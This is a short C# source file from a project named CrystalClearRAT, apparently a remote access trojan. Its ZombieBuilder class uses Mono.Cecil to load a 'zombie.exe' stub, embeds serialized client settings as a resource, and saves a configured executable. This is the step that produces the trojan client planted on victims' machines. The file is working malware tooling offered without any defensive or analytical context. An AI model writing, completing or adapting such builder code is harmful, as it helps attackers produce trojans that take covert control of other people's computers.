using CrystalClearRAT.Properties;
using CrystalRATShared.Helper;
using Mono.Cecil;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CrystalClearRAT.Helper
{
   public static class ZombieBuilder
    {

        public static void Build(ClientSettings settings, string savePath)
        {
            AssemblyDefinition targetasmdef = AssemblyDefinition.ReadAssembly("Resources/zombie.exe");

            using (MemoryStream ms = new MemoryStream())
            {
                using (StreamWriter writer = new StreamWriter(ms))
                {
                    targetasmdef.MainModule.Resources.Add(new EmbeddedResource(ClientSettings.SettingsResourceName, ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(settings))));
                    targetasmdef.Write(savePath);

                }

            }
        }

    }
}
